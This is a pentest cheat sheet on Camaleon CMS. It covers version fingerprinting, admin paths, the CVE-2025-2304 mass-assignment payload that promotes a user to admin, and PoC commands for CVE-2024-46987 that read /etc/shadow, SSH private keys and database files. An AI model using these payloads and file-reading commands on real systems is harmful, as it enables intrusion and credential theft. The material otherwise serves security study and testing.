# Camaleon CMS

Ruby-based CMS. Version often in footer: e.g. "Camaleon CMS ... Version 2.9.0".

**Paths:** `/admin/login`, `/admin/register` (registration may be open).

---

## Discovery

* Footer: "Copyright © ... Camaleon CMS. See intro. Version X.X.X"
* Admin: `http://TARGET/admin/login`, `http://TARGET/admin/register`
* Nuclei / feroxbuster with CMS wordlists can find themes and assets (`/assets/themes/camaleon_first/`, `/assets/camaleon_cms/`).

---

## CVE-2025-2304 – Mass assignment (user → admin)

Versions **prior to 2.8.1** allow mass assignment in the profile update: injecting `password[role]=admin` (and password fields) into the password update scope promotes the user to admin. Some public PoCs also set the password to a fixed value (e.g. `admin`); after exploitation log in with the new password.

```bash
# PoC (creates admin from low-priv user; may change password to "admin")
python3 main.py --url http://TARGET --user jack --password jack123
# Then log in with jack / admin (or whatever the PoC sets)
```

**PoC:** https://github.com/7acini/CVE-2025-2304-CamaleonCMS-PoC

---

## CVE-2024-46987 – LFI (authenticated)

Authenticated LFI: arbitrary file read as the app user. Useful for `/etc/passwd`, `/etc/shadow`, SSH keys, nginx/config, and `/proc/self/fd/N` (open files, e.g. SQLite DB).

```bash
# Read file
python3 CVE-2024-46987.py --url http://TARGET -l USER -p PASSWORD /etc/passwd
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /home/william/.ssh/id_rsa
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /etc/nginx/sites-available/default

# Dump to file (for binary, e.g. DB: write r.content to file, not r.text)
python3 CVE-2024-46987.py --url http://TARGET -l jack -p admin /proc/self/fd/7 > /tmp/db.sqlite
```

**PoC:** https://github.com/Goultarde/CVE-2024-46987

---

## Related CVEs (version-dependent)

* **CVE-2024-46986** – Arbitrary file write (prior to 2.8.2).
* **CVE-2023-30145** – SSTI via `formats` parameter (below 2.7.0; fixed in 2.7.4).

Check version in footer and run the appropriate exploit.
